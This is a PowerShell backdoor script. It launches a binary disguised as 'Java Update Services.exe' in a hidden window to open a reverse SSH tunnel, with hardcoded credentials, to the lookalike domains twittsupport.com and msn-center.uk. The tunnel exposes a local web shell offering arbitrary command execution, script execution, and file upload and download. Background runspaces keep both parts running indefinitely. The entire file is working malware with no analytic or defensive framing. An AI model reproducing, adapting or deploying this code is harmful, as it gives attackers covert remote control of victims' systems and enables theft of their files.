
$connected = $false

function P
{

$domain = "twittsupport.com"
$domain2 = "msn-center.uk"
$Path = "C:\ProgramData\Microsoft\Diagnostic\Java Update Services.exe"
$command = "echo Y | $Path $domain -P 443 -C -R 127.0.0.1:9090:127.0.0.1:49450 -l Israel -pw Israel@123!"
$command2 = "echo Y | $Path $domain2 -P 443 -C -R 127.0.0.1:9090:127.0.0.1:49450 -l Israel -pw Israel@123!"
try
    {
        [System.Net.IPHostEntry] $query = [System.Net.Dns]::GetHostEntry($domain);

        [string]$ip = $query.AddressList[0].ToString()


        if(![String]::IsNullOrEmpty($ip))
        {

            start-process cmd.exe "/c  $command" -WindowStyle Hidden
            $connected = $true            
        }
    }
    catch
    {
        Start-Sleep -Seconds 10

        $query = [System.Net.Dns]::GetHostEntry($domain2);

        $ip = $query.AddressList[0].ToString()

        if(![String]::IsNullOrEmpty($ip))
        {
            start-process cmd.exe "/c  $command2" -WindowStyle Hidden
            $connected = $true
        }     
    }

}

Function W ()
{
Param([STRING]$BINDING = 'http://127.0.0.1:49450/', [STRING]$BASEDIR = "")
if ($BASEDIR -eq "")
{	
	$BASEDIR = (Get-Location -PSProvider "FileSystem").ToString()
}

$BASEDIR = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($BASEDIR)
$MIMEHASH = @{".avi"="video/x-msvideo"; ".crt"="application/x-x509-ca-cert"; ".css"="text/css"; ".der"="application/x-x509-ca-cert"; ".flv"="video/x-flv"; ".gif"="image/gif"; ".htm"="text/html"; ".html"="text/html"; ".ico"="image/x-icon"; ".jar"="application/java-archive"; ".jardiff"="application/x-java-archive-diff"; ".jpeg"="image/jpeg"; ".jpg"="image/jpeg"; ".js"="application/x-javascript"; ".mov"="video/quicktime"; ".mp3"="audio/mpeg"; ".mp4"="video/mp4"; ".mpeg"="video/mpeg"; ".mpg"="video/mpeg"; ".pdf"="application/pdf"; ".pem"="application/x-x509-ca-cert"; ".pl"="application/x-perl"; ".png"="image/png"; ".rss"="text/xml"; ".shtml"="text/html"; ".txt"="text/plain"; ".war"="application/java-archive"; ".wmv"="video/x-ms-wmv"; ".xml"="text/xml"}


$HTMLRESPONSECONTENTS = @{
	'GET /'  =  @"
<!doctype html><html><body>
	!HEADERLINE
	<pre>!RESULT</pre>
	<form method="GET" action="/">
	<b>!PROMPT&nbsp;</b><input type="text" maxlength=255 size=80 name="command" value='!FORMFIELD'>
	<input type="submit" name="button" value="Enter">
	</form>
</body></html>
"@
	'GET /script'  =  @"
<!doctype html><html><body>
	!HEADERLINE
	<form method="POST" enctype="multipart/form-data" action="/script">
	<p><b>Script to execute:</b><input type="file" name="filedata"></p>
	<b>Parameters:</b><input type="text" maxlength=255 size=80 name="parameter">
	<input type="submit" name="button" value="Execute">
	</form>
</body></html>
"@
	'GET /download'  =  @"
<!doctype html><html><body>
	!HEADERLINE
	<pre>!RESULT</pre>
	<form method="POST" action="/download">
	<b>Path to file:</b><input type="text" maxlength=255 size=80 name="filepath" value='!FORMFIELD'>
	<input type="submit" name="button" value="Download">
	</form>
</body></html>
"@
	'POST /download'  =  @"
<!doctype html><html><body>
	!HEADERLINE
	<pre>!RESULT</pre>
	<form method="POST" action="/download">
	<b>Path to file:</b><input type="text" maxlength=255 size=80 name="filepath" value='!FORMFIELD'>
	<input type="submit" name="button" value="Download">
	</form>
</body></html>
"@
	'GET /upload'  =  @"
<!doctype html><html><body>
	!HEADERLINE
	<form method="POST" enctype="multipart/form-data" action="/upload">
	<p><b>File to upload:</b><input type="file" name="filedata"></p>
	<b>Path to store on webserver:</b><input type="text" maxlength=255 size=80 name="filepath">
	<input type="submit" name="button" value="Upload">
	</form>
</body></html>
"@
	'POST /script' = "<!doctype html><html><body>!HEADERLINE<pre>!RESULT</pre></body></html>"
	'POST /upload' = "<!doctype html><html><body>!HEADERLINE<pre>!RESULT</pre></body></html>"
	'GET /exit' = "<!doctype html><html><body>Stopped powershell webserver</body></html>"
	'GET /quit' = "<!doctype html><html><body>Stopped powershell webserver</body></html>"
	'GET /log' = "<!doctype html><html><body>!HEADERLINELog of powershell webserver:<br /><pre>!RESULT</pre></body></html>"
	'GET /starttime' = "<!doctype html><html><body>!HEADERLINEPowershell webserver started at $(Get-Date -Format s)</body></html>"
	'GET /time' = "<!doctype html><html><body>!HEADERLINECurrent time: !RESULT</body></html>"
	'GET /beep' = "<!doctype html><html><body>!HEADERLINEBEEP...</body></html>"
}


$HEADERLINE = "<p><a href='/'>Command execution</a> <a href='/script'>Execute script</a> <a href='/download'>Download file</a> <a href='/upload'>Upload file</a> <a href='/log'>Web logs</a> <a href='/starttime'>Webserver start time</a> <a href='/time'>Current time</a> <a href='/beep'>Beep</a> <a href='/quit'>Stop webserver</a></p>"
"$(Get-Date -Format s) Starting powershell webserver..."
$LISTENER = New-Object System.Net.HttpListener
$LISTENER.Prefixes.Add($BINDING)
$LISTENER.Start()
$Error.Clear()

try
{
	"$(Get-Date -Format s) Powershell webserver started."
	$WEBLOG = "$(Get-Date -Format s) Powershell webserver started.`n"
	while ($LISTENER.IsListening)
	{
		
		$CONTEXT = $LISTENER.GetContext()
		$REQUEST = $CONTEXT.Request
		$RESPONSE = $CONTEXT.Response
		$RESPONSEWRITTEN = $FALSE

		
		"$(Get-Date -Format s) $($REQUEST.RemoteEndPoint.Address.ToString()) $($REQUEST.httpMethod) $($REQUEST.Url.PathAndQuery)"
		
		$WEBLOG += "$(Get-Date -Format s) $($REQUEST.RemoteEndPoint.Address.ToString()) $($REQUEST.httpMethod) $($REQUEST.Url.PathAndQuery)`n"

		
		$RECEIVED = '{0} {1}' -f $REQUEST.httpMethod, $REQUEST.Url.LocalPath
		$HTMLRESPONSE = $HTMLRESPONSECONTENTS[$RECEIVED]
		$RESULT = ''

		
		switch ($RECEIVED)
		{
			"GET /"
			{	
				$FORMFIELD = ''
				$FORMFIELD = [URI]::UnescapeDataString(($REQUEST.Url.Query -replace "\+"," "))
				
				$FORMFIELD = $FORMFIELD -replace "\?command=","" -replace "\?button=enter","" -replace "&command=","" -replace "&button=enter",""
				
				if (![STRING]::IsNullOrEmpty($FORMFIELD))
				{
					try {
						
						$RESULT = Invoke-Expression -EA SilentlyContinue $FORMFIELD 2> $NULL | Out-String
					}
					catch
					{
						
					}
					if ($Error.Count -gt 0)
					{ 
						$RESULT += "`nError while executing '$FORMFIELD'`n`n"
						$RESULT += $Error[0]
						$Error.Clear()
					}
				}
				
				$HTMLRESPONSE = $HTMLRESPONSE -replace '!FORMFIELD', $FORMFIELD
				
				$PROMPT = "PS $PWD>"
				$HTMLRESPONSE = $HTMLRESPONSE -replace '!PROMPT', $PROMPT
				break
			}

			"GET /script"
			{ 
				break
			}

			"POST /script"
			{ 

				
				if ($REQUEST.HasEntityBody)
				{
					
					$RESULT = "Received corrupt or incomplete form data"

					
					if ($REQUEST.ContentType)
					{
						
						$BOUNDARY = $NULL
						if ($REQUEST.ContentType -match "boundary=(.*);")
						{	$BOUNDARY = "--" + $MATCHES[1] }
						else
						{ 
							if ($REQUEST.ContentType -match "boundary=(.*)$")
							{ $BOUNDARY = "--" + $MATCHES[1] }
						}

						if ($BOUNDARY)
						{ 

							
							$READER = New-Object System.IO.StreamReader($REQUEST.InputStream, $REQUEST.ContentEncoding)
							$DATA = $READER.ReadToEnd()
							$READER.Close()
							$REQUEST.InputStream.Close()

							$PARAMETERS = ""
							$SOURCENAME = ""

							
							$DATA -replace "$BOUNDARY--\r\n", "$BOUNDARY`r`n--" -split "$BOUNDARY\r\n" | ForEach-Object {
								
								if (($_ -ne "") -and ($_ -ne "--"))
								{
									
									if ($_.IndexOf("`r`n`r`n") -gt 0)
									{
										
										
										if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "Content-Disposition: form-data; name=(.*);")
										{
											$HEADERNAME = $MATCHES[1] -replace '\"'
											
											if ($HEADERNAME -eq "filedata")
											{ 
												if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "filename=(.*)")
												{ 
													$SOURCENAME = $MATCHES[1] -replace "`r`n$" -replace "`r$" -replace '\"'
													
													$FILEDATA = $_.Substring($_.IndexOf("`r`n`r`n") + 4) -replace "`r`n$"
												}
											}
										}
										else
										{ 
											if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "Content-Disposition: form-data; name=(.*)")
											{ 
												$HEADERNAME = $MATCHES[1] -replace '\"'
												
												if ($HEADERNAME -eq "parameter")
												{ 
													$PARAMETERS = $_.Substring($_.IndexOf("`r`n`r`n") + 4) -replace "`r`n$" -replace "`r$"
												}
											}
										}
									}
								}
							}

							if ($SOURCENAME -ne "")
							{ 

								$EXECUTE = "function Powershell-WebServer-Func {`n" + $FILEDATA + "`n}`nPowershell-WebServer-Func " + $PARAMETERS
								try {
									
									$RESULT = Invoke-Expression -EA SilentlyContinue $EXECUTE 2> $NULL | Out-String
								}
								catch
								{
									
								}
								if ($Error.Count -gt 0)
								{ 
									$RESULT += "`nError while executing script $SOURCENAME`n`n"
									$RESULT += $Error[0]
									$Error.Clear()
								}
							}
							else
							{
								$RESULT = "No file data received"
							}
						}
					}
				}
				else
				{
					$RESULT = "No client data received"
				}
				break
			}

			{ $_ -like "* /download" } 
			{	

				
				if ($REQUEST.HasEntityBody)
				{ 
					
					$READER = New-Object System.IO.StreamReader($REQUEST.InputStream, $REQUEST.ContentEncoding)
					$DATA = $READER.ReadToEnd()
					$READER.Close()
					$REQUEST.InputStream.Close()

					
					$HEADER = @{}
					$DATA.Split('&') | ForEach-Object { $HEADER.Add([URI]::UnescapeDataString(($_.Split('=')[0] -replace "\+"," ")), [URI]::UnescapeDataString(($_.Split('=')[1] -replace "\+"," "))) }

					
					$FORMFIELD = $HEADER.Item('filepath')
					
					$FORMFIELD = $FORMFIELD -replace "^`"","" -replace "`"$",""
				}
				else
				{ 

					
					$FORMFIELD = ''
					$FORMFIELD = [URI]::UnescapeDataString(($REQUEST.Url.Query -replace "\+"," "))
					
					$FORMFIELD = $FORMFIELD -replace "\?filepath=","" -replace "\?button=download","" -replace "&filepath=","" -replace "&button=download",""
					#
					$FORMFIELD = $FORMFIELD -replace "^`"","" -replace "`"$",""
				}

				
				if (![STRING]::IsNullOrEmpty($FORMFIELD))
				{ 
					if (Test-Path $FORMFIELD -PathType Leaf)
					{
						try {
							
							$BUFFER = [System.IO.File]::ReadAllBytes($FORMFIELD)
							$RESPONSE.ContentLength64 = $BUFFER.Length
							$RESPONSE.SendChunked = $FALSE
							$RESPONSE.ContentType = "application/octet-stream"
							$FILENAME = Split-Path -Leaf $FORMFIELD
							$RESPONSE.AddHeader("Content-Disposition", "attachment; filename=$FILENAME")
							$RESPONSE.AddHeader("Last-Modified", [IO.File]::GetLastWriteTime($FORMFIELD).ToString('r'))
							$RESPONSE.AddHeader("Server", "Powershell Webserver/1.2 on ")
							$RESPONSE.OutputStream.Write($BUFFER, 0, $BUFFER.Length)
							
							$RESPONSEWRITTEN = $TRUE
						}
						catch
						{
							
						}
						if ($Error.Count -gt 0)
						{ 
							$RESULT += "`nError while downloading '$FORMFIELD'`n`n"
							$RESULT += $Error[0]
							$Error.Clear()
						}
					}
					else
					{
						
						$RESULT = "File $FORMFIELD not found"
					}
				}
				
				$HTMLRESPONSE = $HTMLRESPONSE -replace '!FORMFIELD', $FORMFIELD
				break
			}

			"GET /upload"
			{ 
				break
			}

			"POST /upload"
			{ 

				
				if ($REQUEST.HasEntityBody)
				{
					
					$RESULT = "Received corrupt or incomplete form data"

					
					if ($REQUEST.ContentType)
					{
						
						$BOUNDARY = $NULL
						if ($REQUEST.ContentType -match "boundary=(.*);")
						{	$BOUNDARY = "--" + $MATCHES[1] }
						else
						{ 
							if ($REQUEST.ContentType -match "boundary=(.*)$")
							{ $BOUNDARY = "--" + $MATCHES[1] }
						}

						if ($BOUNDARY)
						{ 

							
							$READER = New-Object System.IO.StreamReader($REQUEST.InputStream, $REQUEST.ContentEncoding)
							$DATA = $READER.ReadToEnd()
							$READER.Close()
							$REQUEST.InputStream.Close()

							
							$FILENAME = ""
							$SOURCENAME = ""

							
							$DATA -replace "$BOUNDARY--\r\n", "$BOUNDARY`r`n--" -split "$BOUNDARY\r\n" | ForEach-Object {
								
								if (($_ -ne "") -and ($_ -ne "--"))
								{
									
									if ($_.IndexOf("`r`n`r`n") -gt 0)
									{
										
										if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "Content-Disposition: form-data; name=(.*);")
										{
											$HEADERNAME = $MATCHES[1] -replace '\"'
											
											if ($HEADERNAME -eq "filedata")
											{ 
												if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "filename=(.*)")
												{ 
													$SOURCENAME = $MATCHES[1] -replace "`r`n$" -replace "`r$" -replace '\"'
													
													$FILEDATA = $_.Substring($_.IndexOf("`r`n`r`n") + 4) -replace "`r`n$"
												}
											}
										}
										else
										{ 
											if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "Content-Disposition: form-data; name=(.*)")
											{ 
												$HEADERNAME = $MATCHES[1] -replace '\"'
												
												if ($HEADERNAME -eq "filepath")
												{ 
													$FILENAME = $_.Substring($_.IndexOf("`r`n`r`n") + 4) -replace "`r`n$" -replace "`r$" -replace '\"'
												}
											}
										}
									}
								}
							}

							if ($FILENAME -ne "")
							{ 
								if ($SOURCENAME -ne "")
								{ 

									
									$TARGETNAME = ""
									
									if (Test-Path $FILENAME -PathType Container)
									{
										$TARGETNAME = Join-Path $FILENAME -ChildPath $(Split-Path $SOURCENAME -Leaf)
									} else {
										
										$TARGETNAME = $FILENAME
									}

									try {
										
										[IO.File]::WriteAllText($TARGETNAME, $FILEDATA, $REQUEST.ContentEncoding)
									}
									catch
									{
										
									}
									if ($Error.Count -gt 0)
									{ 
										$RESULT += "`nError saving '$TARGETNAME'`n`n"
										$RESULT += $Error[0]
										$Error.Clear()
									}
									else
									{ 
										$RESULT = "File $SOURCENAME successfully uploaded as $TARGETNAME"
									}
								}
								else
								{
									$RESULT = "No file data received"
								}
							}
							else
							{
								$RESULT = "Missing target file name"
							}
						}
					}
				}
				else
				{
					$RESULT = "No client data received"
				}
				break
			}

			"GET /log"
			{ 
				$RESULT = $WEBLOG
				break
			}

			"GET /time"
			{ 
				$RESULT = Get-Date -Format s
				break
			}

			"GET /starttime"
			{ 
				break
			}

			"GET /beep"
			{ 
				[CONSOLE]::beep(800, 300) 
				break
			}

			"GET /quit"
			{ 
				break
			}

			"GET /exit"
			{ 
				break
			}

			default
			{	

				
				$CHECKDIR = $BASEDIR.TrimEnd("/\") + $REQUEST.Url.LocalPath
				$CHECKFILE = ""
				if (Test-Path $CHECKDIR -PathType Container)
				{ # physical path is a directory
					$IDXLIST = "/index.htm", "/index.html", "/default.htm", "/default.html"
					foreach ($IDXNAME in $IDXLIST)
					{ 
						$CHECKFILE = $CHECKDIR.TrimEnd("/\") + $IDXNAME
						if (Test-Path $CHECKFILE -PathType Leaf)
						{
							break
						}
						$CHECKFILE = ""
					}

					if ($CHECKFILE -eq "")
					{ 
						$HTMLRESPONSE = "<!doctype html><html><head><title>$($REQUEST.Url.LocalPath)</title><meta charset=""utf-8""></head><body><H1>$($REQUEST.Url.LocalPath)</H1><hr><pre>"
						if ($REQUEST.Url.LocalPath -ne "" -And $REQUEST.Url.LocalPath -ne "/" -And $REQUEST.Url.LocalPath -ne "`\"  -And $REQUEST.Url.LocalPath -ne ".")
						{ 
							$PARENTDIR = (Split-Path $REQUEST.Url.LocalPath -Parent) -replace '\\','/'
							if ($PARENTDIR.IndexOf("/") -ne 0) { $PARENTDIR = "/" + $PARENTDIR }
							$HTMLRESPONSE += "<pre><a href=""$PARENTDIR"">[To Parent Directory]</a><br><br>"
						}

						
						$ENTRIES = Get-ChildItem -EA SilentlyContinue -Path $CHECKDIR

						
						$ENTRIES | Where-Object { $_.PSIsContainer } | ForEach-Object { $HTMLRESPONSE += "$($_.LastWriteTime.ToString())       &lt;dir&gt; <a href=""$(Join-Path $REQUEST.Url.LocalPath $_.Name)"">$($_.Name)</a><br>" }

						
						$ENTRIES | Where-Object { !$_.PSIsContainer } | ForEach-Object { $HTMLRESPONSE += "$($_.LastWriteTime.ToString())  $("{0,10}" -f $_.Length) <a href=""$(Join-Path $REQUEST.Url.LocalPath $_.Name)"">$($_.Name)</a><br>" }

						
						$HTMLRESPONSE += "</pre><hr></body></html>"
					}
				}
				else
					{ 
						if (Test-Path $CHECKDIR -PathType Leaf)
						{ 
							$CHECKFILE = $CHECKDIR
						}
					}

				if ($CHECKFILE -ne "")
				{ 
					try {
						
						$BUFFER = [System.IO.File]::ReadAllBytes($CHECKFILE)
						$RESPONSE.ContentLength64 = $BUFFER.Length
						$RESPONSE.SendChunked = $FALSE
						$EXTENSION = [IO.Path]::GetExtension($CHECKFILE)
						if ($MIMEHASH.ContainsKey($EXTENSION))
						{ 
							$RESPONSE.ContentType = $MIMEHASH.Item($EXTENSION)
						}
						else
						{ 
							$RESPONSE.ContentType = "application/octet-stream"
							$FILENAME = Split-Path -Leaf $CHECKFILE
							$RESPONSE.AddHeader("Content-Disposition", "attachment; filename=$FILENAME")
						}
						$RESPONSE.AddHeader("Last-Modified", [IO.File]::GetLastWriteTime($CHECKFILE).ToString('r'))
						$RESPONSE.AddHeader("Server", "Powershell Webserver/1.2 on ")
						$RESPONSE.OutputStream.Write($BUFFER, 0, $BUFFER.Length)
						
						$RESPONSEWRITTEN = $TRUE
					}
					catch
					{
						
					}
					if ($Error.Count -gt 0)
					{
						$RESULT += "`nError while downloading '$CHECKFILE'`n`n"
						$RESULT += $Error[0]
						$Error.Clear()
					}
				}
				else
				{	
					if (!(Test-Path $CHECKDIR -PathType Container))
					{
						$RESPONSE.StatusCode = 404
						$HTMLRESPONSE = '<!doctype html><html><body>Diese Seite ist nicht vorhanden</body></html>'
					}
				}
			}

		}

		
		if (!$RESPONSEWRITTEN)
		{
			
			$HTMLRESPONSE = $HTMLRESPONSE -replace '!HEADERLINE', $HEADERLINE

			
			$HTMLRESPONSE = $HTMLRESPONSE -replace '!RESULT', $RESULT

			
			$BUFFER = [Text.Encoding]::UTF8.GetBytes($HTMLRESPONSE)
			$RESPONSE.ContentLength64 = $BUFFER.Length
			$RESPONSE.AddHeader("Last-Modified", [DATETIME]::Now.ToString('r'))
			$RESPONSE.AddHeader("Server", "Powershell Webserver/1.2 on ")
			$RESPONSE.OutputStream.Write($BUFFER, 0, $BUFFER.Length)
		}

		
		$RESPONSE.Close()

		
		if ($RECEIVED -eq 'GET /exit' -or $RECEIVED -eq 'GET /quit')
		{ 
			"$(Get-Date -Format s) Stopping powershell webserver..."
			break;
		}
	}
}
finally
{
	
	$LISTENER.Stop()
	$LISTENER.Close()
	"$(Get-Date -Format s) Powershell webserver stopped."
}
}

function WRunner()
{         
        
        
        $initialsessionstateeval = [System.Management.Automation.Runspaces.initialSessionState]::CreateDefault()

        $funcHtPost = Get-Content Function:\W -ErrorAction Stop
        $addfuncPost = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList "W", $funcHtPost
        $initialsessionstateeval.Commands.Add($addfuncPost)
               
        $runspaceeval = [runspacefactory]::CreateRunspace($initialsessionstateeval)
        $runspaceeval.ThreadOptions = "ReuseThread"
        $runspaceeval.Open()
    



        [powershell]$eval = [powershell]::Create()

        [void]$eval.AddScript({

             W
 
    })
           
            
            $eval.Runspace = $runspaceeval
            $eval.BeginInvoke() | Out-Null
    }

function PRunner()
{         
        
        
        $initialsessionstateeval = [System.Management.Automation.Runspaces.initialSessionState]::CreateDefault()

        $funcHtPost = Get-Content Function:\P -ErrorAction Stop
        $addfuncPost = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList "P", $funcHtPost
        $initialsessionstateeval.Commands.Add($addfuncPost)
               
        $runspaceeval = [runspacefactory]::CreateRunspace($initialsessionstateeval)
        $runspaceeval.ThreadOptions = "ReuseThread"
        $runspaceeval.Open()
    



        [powershell]$eval = [powershell]::Create()

        [void]$eval.AddScript({
             Start-Sleep 10
             P
 
    })
           
            
            $eval.Runspace = $runspaceeval
            $eval.BeginInvoke() | Out-Null
    }

WRunner
PRunner

while($true)
{
    Start-Sleep 60  
}    
